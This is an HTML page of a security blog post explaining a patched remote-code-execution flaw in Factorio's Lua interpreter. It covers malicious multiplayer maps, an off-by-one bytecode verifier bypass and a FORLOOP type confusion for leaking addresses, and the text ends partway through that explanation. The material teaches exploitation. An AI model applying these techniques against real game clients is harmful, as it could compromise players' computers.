<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline';">

    <style>
        :root {
            --accent-color: #FF4D4D;
        }
    </style>

    
    <title>Bytecode Breakdown: Unraveling Factorio&#39;s Lua Security Flaws</title>
    <meta name="description" content="Dynamic languages are safe from memory corruptions bugs, right?">
    <meta name="keywords" content='blog, memorycorruption, security, research, Research, Pwn, Lua'>

    <meta property="og:url" content="https://memorycorruption.net/posts/rce-lua-factorio/">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Bytecode Breakdown: Unraveling Factorio&#39;s Lua Security Flaws">
    <meta property="og:description" content="Dynamic languages are safe from memory corruptions bugs, right?">
    <meta property="og:image" content="https://memorycorruption.net/posts/rce-lua-factorio/rocket-man_huafd99224b33f189054ca835273c63a66_4611746_1920x0_resize_q75_bgffffff_box_3.jpg">
    <meta property="og:image:secure_url" content="https://memorycorruption.net/posts/rce-lua-factorio/rocket-man_huafd99224b33f189054ca835273c63a66_4611746_1920x0_resize_q75_bgffffff_box_3.jpg">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Bytecode Breakdown: Unraveling Factorio&#39;s Lua Security Flaws">
    <meta name="twitter:description" content="Dynamic languages are safe from memory corruptions bugs, right?">
    <meta property="twitter:domain" content="https://memorycorruption.net/posts/rce-lua-factorio/">
    <meta property="twitter:url" content="https://memorycorruption.net/posts/rce-lua-factorio/">
    <meta name="twitter:image" content="https://memorycorruption.net/posts/rce-lua-factorio/rocket-man_huafd99224b33f189054ca835273c63a66_4611746_1920x0_resize_q75_bgffffff_box_3.jpg">

    
    <link rel="canonical" href="https://memorycorruption.net/posts/rce-lua-factorio/">
    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
    <script src="/js/bundle.min.676096fc3ebd5fc54d9f5116926446daff1ba3fec34dc5f56eaa5a9ef988b621.js" integrity="sha256-Z2CW/D69X8VNn1EWkmRG2v8bo/7DTcX1bqpanvmItiE="></script>

    
</head>
<body>
        <script>
            
            setThemeByUserPref();
        </script><header class="header">
    <nav class="header-nav">

        <div class="nav-title">
            <a class="nav-brand" href="https://memorycorruption.net/">Memory Corruption</a>
        </div>

        <div class="nav-links">
            <div class="nav-link">
                <a href="/"><span data-feather='home'></span> Home </a>
            </div>
            <div class="nav-link">
                <a href="/posts/"><span data-feather='book'></span> Posts </a>
            </div>
            <div class="nav-link">
                <a href="/tags/"><span data-feather='tag'></span> Tags </a>
            </div>
            <div class="nav-link">
                <a href="/index.xml"><span data-feather='rss'></span>  </a>
            </div>

            <span class="nav-icons-divider"></span>
            <div class="nav-link dark-theme-toggle">
                <span class="sr-only dark-theme-toggle-screen-reader-target"></span>
                <a>
                    <span class="theme-toggle-icon" data-feather="moon"></span>
                </a>
            </div>

            <div class="nav-link" id="hamburger-menu-toggle">
                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
                <a>
                    <span data-feather="menu"></span>
                </a>
            </div>

            
            <ul class="nav-hamburger-list visibility-hidden">
                <li class="nav-item">
                    <a href="/"><span data-feather='home'></span> Home </a>
                </li>
                <li class="nav-item">
                    <a href="/posts/"><span data-feather='book'></span> Posts </a>
                </li>
                <li class="nav-item">
                    <a href="/tags/"><span data-feather='tag'></span> Tags </a>
                </li>
                <li class="nav-item">
                    <a href="/index.xml"><span data-feather='rss'></span>  </a>
                </li>
                <li class="nav-item dark-theme-toggle">
                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
                    <a>
                        <span class="theme-toggle-icon" data-feather="moon"></span>
                    </a>
                </li>
            </ul>

        </div>
    </nav>
</header>
<main id="content">
    <div class="post container">
    <div class="post-header-section">
        <h1>Bytecode Breakdown: Unraveling Factorio&#39;s Lua Security Flaws</h1>
        <small role="doc-subtitle">Dynamic languages are safe from memory corruptions bugs, right?</small>
        <p class="post-date">29/06/2024
        
        </p>

        <ul class="post-tags">
        
            <li class="post-tag"><a href="https://memorycorruption.net/tags/research">Research</a></li>
        
            <li class="post-tag"><a href="https://memorycorruption.net/tags/pwn">Pwn</a></li>
        
            <li class="post-tag"><a href="https://memorycorruption.net/tags/lua">Lua</a></li>
        
        </ul>
    </div>

    <div class="post-content">
        <p>
  
    <picture>
        <source srcset="/posts/rce-lua-factorio/rocket-man_huafd99224b33f189054ca835273c63a66_4611746_1920x1080_resize_q75_h2_box_3.webp" type="image/webp">
        <img src="/posts/rce-lua-factorio/rocket-man_huafd99224b33f189054ca835273c63a66_4611746_1920x1080_resize_q75_bgffffff_box_3.jpg" alt="Rocket Man"
            loading="lazy"
            referrerpolicy="same-origin"
        >
      </picture>
  </p>
<p>Some months ago I exploited a vulnerability in the Lua implementation of 
<a href="https://www.factorio.com/" title="Official Page" target="_blank" rel="noopener">Factorio</a>
 that <strong>allowed a malicious server to obtain arbitrary execution on clients</strong>. As the vulnerability has been patched for months already (Factorio versions <strong>below 1.1.101</strong> are affected), is time to share the details with the community.</p>
<p>I think this is a very interesting topic, that can serve as an introduction to understand other dynamic languages such as <em>Javascript</em>, where similar ideas are used for exploitation. For this reason, this is an <strong>in-depth</strong> explaination of the vulnerability, so that it can be used by others as a reference to understand how these attacks work.</p>
<p>In addition to this, at the end of the post you will find a <strong>challenge</strong> to practice the techniques explained in this post in a gamified environment, <strong>directly in your browser</strong>.</p>
<p><strong>You can jump directly to the challenge:</strong> 
<a href="#your-turn" rel="noopener">Your Turn</a>
</p>
<h1 id="what-is-factorio">What is Factorio?</h1>
<p>Factorio is a game in which you automate a factory to build a rocket and escape from a planet. Based on their website, they have sold more than 
<a href="https://factorio.com/support/press-kit" target="_blank" rel="noopener">3,500,000 copies of the game</a>
, making it
a juicy target for security researchers</p>








<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
    <a href="https://www.youtube.com/watch?v=BqaAjgpsoW8" data-iframe-data="{&#34;allow&#34;:&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34;,&#34;allowfullscreen&#34;:&#34;allowfullscreen&#34;,&#34;loading&#34;:&#34;eager&#34;,&#34;referrerpolicy&#34;:&#34;strict-origin-when-cross-origin&#34;,&#34;src&#34;:&#34;https://www.youtube-nocookie.com/embed/BqaAjgpsoW8?autoplay=1\u0026controls=1\u0026end=0\u0026loop=0\u0026mute=1\u0026rel=0\u0026start=0&#34;,&#34;style&#34;:&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34;,&#34;title&#34;:&#34;YouTube video&#34;}" class="shortcode-youtube" rel="noreferrer" target="_blank" onclick="replaceWithYoutubeIframe(event, this)">
        <img src="/posts/rce-lua-factorio/trailer-thumbnail_hua1ccbde770766f8f651c43923245a36d_342261_1280x0_resize_q75_box.jpg" alt="YouTube video">
    </a>
</div>
<h2 id="how-is-lua-used-in-the-game">How is Lua used in the game?</h2>
<p>Lua is used in Factorio to implement some game logic and to <strong>create mods</strong> and <strong>custom maps</strong> that can be downloaded from in-game or from their 
<a href="https://mods.factorio.com/" title="Mods Browser" target="_blank" rel="noopener">website</a>
. The modding community is very active, so there are
<em>thousands</em> of mods available, some with even <strong>more than half a million downloads</strong></p>
<p>
  
    <picture>
        <source srcset="/posts/rce-lua-factorio/most-downloaded-mod_hu87ef96f0b4805001ffaa3865c33619a2_101420_1157x240_resize_q75_h2_box_3.webp" type="image/webp">
        <img src="/posts/rce-lua-factorio/most-downloaded-mod_hu87ef96f0b4805001ffaa3865c33619a2_101420_1157x240_resize_q75_bgffffff_box_3.jpg" alt="Alien Biomes mod" title="The Alien Biomes mod has 551K downloads"
            loading="lazy"
            referrerpolicy="same-origin"
        >
          <figcaption>The Alien Biomes mod has 551K downloads</figcaption>
      </picture>
  </p>
<p>Based on this information, it might seem that the surface of the <em>Lua interpreter</em> in the game is limited to <strong>local exploits</strong> that <em>require the user to download a malicious mod</em>. That would already be an issue, as
compromising one mod (either finding a vulnerability in it / compromising the source) has the potential to reach <strong>millions of users</strong>, but we are missing a small detail that <strong>exposes the lua interpreter to the network</strong>, opening the door to more interesting attacks</p>
<h2 id="the-more-the-merrier">The more the merrier</h2>
<p>On the 
<a href="https://wiki.factorio.com/Desynchronization" target="_blank" rel="noopener">Factorio wiki</a>
 there is a <strong>very important</strong> implementation detail of the multiplayer mode:</p>
<blockquote>
<p>Factorio multiplayer code uses deterministic lockstep to synchronize clients. This is a method of synchronizing a game from one computer to another by sending only the user inputs that control that game, rather than networking the state of the objects in the game itself. It means that <strong>all player&rsquo;s games need to simulate every single tick of the game identically</strong>. If any computer does something ever-so-slightly different, a desynchronization (desync) occurs. The game includes processes to ensure any issues with network traffic do not cause desyncs.</p>
</blockquote>
<p>That means that <em>if</em> one player executes some Lua code, the rest of the players <strong>must</strong> execute it in order to preserve the syncronization of the game. Failing to do so will result in a desync state, disconnecting the client from the game with an error message, as also seen in the wiki</p>
<p>
  
    <picture>
        <source srcset="/posts/rce-lua-factorio/desync-report_hu46d39e92e2be0de222db9019c39a011e_60830_1101x192_resize_q75_h2_box.webp" type="image/webp">
        <img src="/posts/rce-lua-factorio/desync-report_hu46d39e92e2be0de222db9019c39a011e_60830_1101x192_resize_q75_box.jpg" alt="Desync Error"
            loading="lazy"
            referrerpolicy="same-origin"
        >
      </picture>
  </p>
<p>So we now know that any Lua code we execute is also executed by the rest of players. <em>What are our options to execute lua code?</em> After some research, we end up with <strong>two options</strong>:</p>
<ol>
<li>Use the <code>/c</code> command to execute Lua code in a server (if we have <em>permission</em> to do it)</li>
<li>Creating a custom map that <strong>contains lua code</strong> so it gets executed when a client connects to the server</li>
</ol>
<p>As both options require privileges on a server, we might as well go for the second path.</p>
<p>As the game also features an in-game server browser, an attacker could make it visible there to atract victims.</p>
<h1 id="going-deeper">Going Deeper</h1>
<h2 id="general-exploitation-path">General Exploitation Path</h2>
<p>Now that we have a clear path to reach the Lua interpreter from the network, let&rsquo;s take a quick look at the general exploitation path that we will follow:</p>
<ol>
<li>We host a Factorio server that is serving a <em>malicious map</em>. This map will contain our exploit as part of the Lua code that defines the scenario of the map</li>
<li>When a client connects to our server, they download the map and <strong>execute the Lua code</strong> associated with it (as we have seen before, as state is not shared, clients need to execute the Lua code to ensure syncronization between them)</li>
<li>Our payload will leverage weaknesses in the Lua implementation to <em>craft fake objects</em></li>
<li>These fake objects will allow us to <em>leak/corrupt</em> memory to alter the behaviour of the program</li>
<li>We follow one of the many techniques to gain code execution by leveraging these powerful primitives</li>
</ol>
<h2 id="a-small-leak-will-sink-a-great-ship">A small leak will sink a great ship</h2>
<p>As one can imagine, the official 
<a href="https://www.lua.org/" target="_blank" rel="noopener">Lua interpreter</a>
 contains <em>modules</em> that allow scripts to interact with the host in multiple common ways, such as opening files, executing commands, getting environment variables&hellip; While this might be desirable on normal circumstances, is definitely not okay when executing untrusted code. For this reason, a basic hardening recommendation is to <em>completely disable these modules</em> when compiling Lua for those sensitive environments.</p>
<p>This is the case in Factorio too, where only the following modules are compiled:</p>
<ul>
<li>
<a href="https://www.lua.org/manual/5.2/manual.html#6.10" target="_blank" rel="noopener">debug</a>
 - Provides Access to Debug functionalities</li>
<li>
<a href="https://www.lua.org/manual/5.2/manual.html#6.6" target="_blank" rel="noopener">math</a>
 - Interface to standard C Math</li>
<li>
<a href="https://www.lua.org/manual/5.2/manual.html#6.7" target="_blank" rel="noopener">bit32</a>
 - Bitwise operations</li>
<li>
<a href="https://www.lua.org/manual/5.2/manual.html#6.4" target="_blank" rel="noopener">string</a>
 - Manipulation of strings</li>
<li>
<a href="https://www.lua.org/manual/5.2/manual.html#6.5" target="_blank" rel="noopener">table</a>
 - Manipulation of tables</li>
<li>
<a href="https://www.lua.org/manual/5.2/manual.html#6.1" target="_blank" rel="noopener">base</a>
 - Core Functions of Lua, such as <code>print</code></li>
</ul>
<p>However, the devil is in the details, and while modules that have names like <code>os</code> with functions like <code>execute</code> are easily recognizable are <strong>dangerous</strong>, others like <code>load</code> or <code>loadstring</code> that are part of the <code>base</code> module might be seem as benign, while they are arguably <strong>the most powerful functions of Lua</strong>.</p>
<p><em>Why are these functions so powerful?</em> Because they allow executing <strong>bytecode</strong>.</p>
<h3 id="who-controls-the-bytecode-controls-the-future">Who controls the Bytecode controls the future</h3>
<p>Lua is an <em>interpreted language</em>, but it doesn&rsquo;t execute the code we write as it is, first, <strong>it is compiled</strong>. This might be a surprise to some, as it seems to be incompatible with the classic view of an interpreted language. However, details are important, <strong>Lua doesn&rsquo;t compile to machine code</strong>, that is, code that your CPU understands. Instead, it compiles into <em>Lua bytecode</em>, which is a representation of the code that can only be executed by the Lua interpreter, making it still an interpreted Language.</p>
<p>Source code is useful for humans, as it is easily readable, but text is hard to work with for computers, so bytecode is a more useful representation for them.</p>
<p>Let&rsquo;s see this in practice so we get a clearer view of how this works.</p>
<p>If we have the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;MemoryCorruption&#34;</span>)
</span></span></code></pre></div><p>Lua is going to generate and execute the following bytecode:</p>

<div class="alert alert-info">All the bytecode snippets in this post were created with <code>luac -l -l &lt;script&gt;</code>. <strong>luac</strong> is provided together with the Lua interpreter
</div>

<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>	GETTABUP	<span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>	; _ENV <span style="color:#e6db74">&#34;print&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>	LOADK	<span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>        ; <span style="color:#e6db74">&#34;MemoryCorruption&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>	CALL	<span style="color:#ae81ff">0</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">1</span>	
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>	RETURN	<span style="color:#ae81ff">0</span> <span style="color:#ae81ff">1</span>	
</span></span></code></pre></div><p>Without knowing anything about bytecode, we can see that somehow Lua is getting the function <code>print</code>, loading a constant <code>MemoryCorruption</code>, calling print and finally returning.</p>
<p>This bytecode is what gets executed by the interpreter, there are no more conversions or <em>checks</em>. This is why being able to execute bytecode directly is <strong>so powerful</strong>, because you gain the
ability to execute <strong>incorrect bytecode</strong> that under normal circunstances, the compiler <strong>would never generate</strong></p>
<p>For example, what happens if I modify the previous <code>LOADK</code> opcode, that is used to load a constant to use a <strong>Out-Of-Bounds index</strong>? Does the interpreter prevents me from doing that? Or does it leak memory?</p>
<h2 id="bytecode-verifier">Bytecode Verifier</h2>
<p>Aware of the dangers of directly executing bytecode, Lua developers implemented a bytecode verifier in an attempt to protect the interpreter from malicious bytecode. However, it was removed in version 5.2 as it was repeatedly found to be bypassable</p>
<blockquote>
<p>Following several bytecode exploits found by the relentless Peter Cawley
and others, we are considering dropping the bytecode verifier completely in
Lua 5.2. It seems useless to make a promise that we can&rsquo;t seem to deliver
without a much more complicated verifier than the current one, and possibly
with the need for costly runtime checks as well.</p>
<p>Our impression is that applications that are open to running arbitrary Lua
code provided by the user should avoid accepting precompiled scripts. So we
think that adding a flag to load (the Lua function from the base library)
to check for and reject precompiled scripts is enough for Lua-based apps
to be able to reject precompiled scripts if they want to. We don&rsquo;t think
anything else is needed in the C side, since you can always write you own
lua_Reader function to reject precompiled scripts.</p>
<p>At the same time, shedding the bytecode verifier would allow applications
that run their own precompiled scripts that are deemed safe to avoid the
cost of the bytecode verifier. The checks would be limited to the sanity
tests done in lundump.c, which should be enough for flagging accidental
file corruption.</p>
<p>All feedback is welcome.  Thanks.
&ndash;lhf <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
</blockquote>
<p>Even if the official bytecode verifier was not implemented in Lua 5.2.1, Factorio developers seem to have implemented their own in an attempt to protect the Lua interpreter<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. These protections focused primarly in avoiding clearly <strong>OOB parameters</strong>, like trying to jump outside the code or loading a constant with an index bigger than the constants array</p>
<p>This bytecode verifier had some <strong>Off-By-One</strong> issues, as some opcodes can be a little confusing. For example, <code>JMP 0</code> does not really make sense, as it would basically make
an infinite loop, so the jump opcode is <strong>offset by one by default</strong>. This wasn&rsquo;t taken into account in the verifier, so it was possible to jump outside the code block.</p>
<p>This was an issue by itself as there exists the possiblity that the constants are allocated just after the code chunk, so an attacker could <strong>store bytecode in the constants section</strong> to bypass the checks and then jump to it with the off by one. As Lua ignores malformed instructions, the metadata of the chunk would be ignored in most cases, <strong>resulting in execution of the constants as bytecode</strong>.</p>
<h1 id="building-blocks">Building Blocks</h1>
<p>In interpreted languages such as <em>Javascript</em> and <em>Lua</em>, an <em>incredibly powerful primitive</em> is the ability to create <strong>fake objects</strong>. This is because it allow us to <strong>leverage the full power of the interpreter in our advantage</strong>; Strings can be used to leak arbitrary data, arrays allow to write to arbitrary memory and if the language has a way to call native functions, we can use it to control the execution flow.</p>
<p>In addition to this, <em>exploitation can be as complex as we need</em>, as our exploit can make decisions and calculate values dynamically, because at the end we are still executing <em>Javascript/Lua</em> code.</p>
<p>For these reasons, our goal is to gain the ability to create these <strong>fake objects</strong>.</p>
<p>To fulfil this goal, we basically need two things:</p>
<ul>
<li><strong>The ability to leak addresses</strong>: this will allow to place our fake objects in strings, as we will be able to locate them in memory</li>
<li><strong>A way to retrieve an object from an address</strong>: if we can retrieve an object from an arbitrary address, we can use the addresses leaked to get fake objects</li>
</ul>
<h2 id="leaking-addresses">Leaking Addresses</h2>
<p>Normally, leaking addresses in Lua is a feature of the print function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>[MemoryCorruption src] .<span style="color:#f92672">/</span>lua <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;function foo() end print(foo)&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span>: <span style="color:#a6e22e">0x1673490</span>
</span></span></code></pre></div><p>However, not only this was <strong>removed in Factorio</strong>, it also <em>doesn&rsquo;t leak the address of strings</em>, which we want to use to store our fake objects. That means that we will have to craft our own primitive to leak addresses.</p>
<p>A common way to leak addresses in Lua is by <strong>leveraging type confusions between objects</strong>.</p>
<h3 id="introduction-to-tvalues">Introduction to TValues</h3>
<p>To understand how a type confusion leads to leaking addresses, we first need to understand how objects internally work in Lua.</p>
<p>As we know, Lua is a <strong>dynamic language</strong>, so a variable can change its type during runtime:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>foo <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span>
</span></span><span style="display:flex;"><span>print(foo)
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Output: A</span>
</span></span><span style="display:flex;"><span>foo <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>print(foo)
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Output: 1</span>
</span></span><span style="display:flex;"><span>foo <span style="color:#f92672">=</span> print
</span></span><span style="display:flex;"><span>print(foo)
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Output: function</span>
</span></span></code></pre></div><p>However, Lua is written in <strong>C</strong>, which is a <strong>static language</strong>, that means that the type of variables is <strong>set on stone after compilation</strong>. How is possible to build a dynamic language on a static one? Like most things in Computer Science, by adding another <strong>abstration</strong> layer.</p>
<p>Internally in Lua, objects are represented with the <code>TValue</code> structure</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> ptype TValue
</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">lua_TValue</span> {
</span></span><span style="display:flex;"><span>    Value value_;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> tt_;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Where the <code>tt_</code> attribute defines the type of the <code>TValue</code> and the <code>Value</code> attribute is used to access the object represented by the <code>TValue</code>.</p>
<p>As we can see, by doing this, Lua can easily implement dynamic types. In Lua, <strong>everything is a TValue</strong>, so changing the type of a variable just means replacing one <em>TValue</em> with <em>another TValue</em>. When doing operations with the TValues, Lua just has to check the <code>tt_</code> property to know how to access it and what operations are valid.</p>
<p>Inside the <code>Value</code> union we have the value of a <code>TValue</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> ptype <span style="color:#f92672">/</span>o Value
</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> <span style="color:#66d9ef">union</span> <span style="color:#a6e22e">Value</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*                     8 */</span>    GCObject <span style="color:#f92672">*</span>gc;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*                     8 */</span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>p;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*                     4 */</span>    <span style="color:#66d9ef">int</span> b;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*                     8 */</span>    lua_CFunction f;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*                     8 */</span>    lua_Number n;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* total size (bytes):    8 */</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>As we can see, it is basically a <em>space</em> of <strong>8 bytes</strong> that is interpreted either as a double or as a pointer to another structure depending on the type of the <code>TValue</code>.</p>
<p>Notice how <strong>numbers are an special case</strong>. Lua represents <strong>all numbers as doubles</strong><sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>, so there is no need to use a pointer to access it, they can be <strong>stored inline</strong> in the <code>Value</code> union to save space and make access faster, as they have the same size of a pointer.</p>
<p>This detail is <strong>KEY</strong> to leaking pointers in Lua (and also in <strong>V8</strong>!). If we can make Lua think our <code>String</code> is a <code>Number</code>, instead of accessing the <code>Value</code> union as a pointer, it will be accessed as a <em>double</em>. That means that <strong>the pointer of the string will be used as a double</strong>, which might allow us to leak it depending on how is used.</p>
<h3 id="forloop">FORLOOP</h3>
<p>A common place to confuse the types of objects is in loops <sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>. If we can make Lua think any object passed as the initial start point of a numeric loop is a number,
we could leak its address, as it would be available to us as a variable.</p>
<p>In Lua, loops are implemented by the <code>FORLOOP</code> opcode. This opcode <strong>is always preceded</strong> by a <code>FORPREP</code> opcode on numeric loops that checks the type of the arguments and prepares the loop.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>vmcase(OP_FORPREP,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> TValue <span style="color:#f92672">*</span>init <span style="color:#f92672">=</span> ra;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> TValue <span style="color:#f92672">*</span>plimit <span style="color:#f92672">=</span> ra<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> TValue <span style="color:#f92672">*</span>pstep <span style="color:#f92672">=</span> ra<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>tonumber(init, ra))
</span></span><span style="display:flex;"><span>        luaG_runerror(L, LUA_QL(<span style="color:#e6db74">&#34;for&#34;</span>) <span style="color:#e6db74">&#34; initial value must be a number&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (<span style="color:#f92672">!</span>tonumber(plimit, ra<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>        luaG_runerror(L, LUA_QL(<span style="color:#e6db74">&#34;for&#34;</span>) <span style="color:#e6db74">&#34; limit must be a number&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (<span style="color:#f92672">!</span>tonumber(pstep, ra<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>))
</span></span><span style="display:flex;"><span>        luaG_runerror(L, LUA_QL(<span style="color:#e6db74">&#34;for&#34;</span>) <span style="color:#e6db74">&#34; step must be a number&#34;</span>);
</span></span><span style="display:flex;"><span>    setnvalue(ra, luai_numsub(L, nvalue(ra), nvalue(pstep)));
</span></span><span style="display:flex;"><span>    ci<span style="color:#f92672">-&gt;</span>u.l.savedpc <span style="color:#f92672">+=</span> GETARG_sBx(i);
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><p>That means that if we try to leak the address of a function with a loop without messing with the bytecode&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>foo <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(x)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">=</span> x, <span style="color:#ae81ff">100000000000000</span>, <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">do</span> <span style="color:#66d9ef">return</span> i <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(foo(foo))
</span></span></code></pre></div><p>We get an error due to passing a function instead of a number as the <code>for</code> value</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./lua: poc.lua:2: <span style="color:#e6db74">&#39;for&#39;</span> initial value must be a number
</span></span><span style="display:flex;"><span>stack traceback:
</span></span><span style="display:flex;"><span>	poc.lua:2: in <span style="color:#66d9ef">function</span> <span style="color:#e6db74">&#39;foo&#39;</span>
</span></span><span style="display:flex;"><span>	poc.lua:5: in main chunk
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>C<span style="color:#f92672">]</span>: in ?
</span></span></code></pre></div><p>However, if we check the code of the <code>FORLOOP</code> opcode, the <code>step</code> parameter type is not checked, and there is even a comment saying that it is fine</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>vmcase(OP_FORLOOP,
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* not checking ra+2, because I don&#39;t see way how to exploit it not being number */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ttisnumber(ra<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">|</span> <span style="color:#f92672">!</span>ttisnumber(ra))
</span></span><span style="display:flex;"><span>        luaG_runerror(L, LUA_QL(<span style="color:#e6db74">&#34;for&#34;</span>) <span style="color:#e6db74">&#34; bytecode error, control variables need to be numbers&#34;</span>);
</span></span><span style="display:flex;"><span>    lua_Number step <span style="color:#f92672">=</span> nvalue(ra<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>    lua_Number idx <span style="color:#f92672">=</span> luai_numadd(L, nvalue(ra), step); <span style="color:#75715e">/* increment index */</span>
</span></span><span style="display:flex;"><span>    lua_Number limit <span style="color:#f92672">=</span> nvalue(ra<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (luai_numlt(L, <span style="color:#ae81ff">0</span>, step) <span style="color:#f92672">?</span> luai_numle(L, idx, limit)
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">:</span> luai_numle(L, limit, idx)) {
</span></span><span style="display:flex;"><span>        ci<span style="color:#f92672">-&gt;</span>u.l.savedpc <span style="color:#f92672">+=</span> GETARG_sBx(i);  <span style="color:#75715e">/* jump back */</span>
</span></span><span style="display:flex;"><span>        setnvalue(ra, idx);  <span style="color:#75715e">/* update internal index... */</span>
</span></span><span style="display:flex;"><span>        setnvalue(ra<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>, idx);  <span style="color:#75715e">/* ...and external index */</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>)
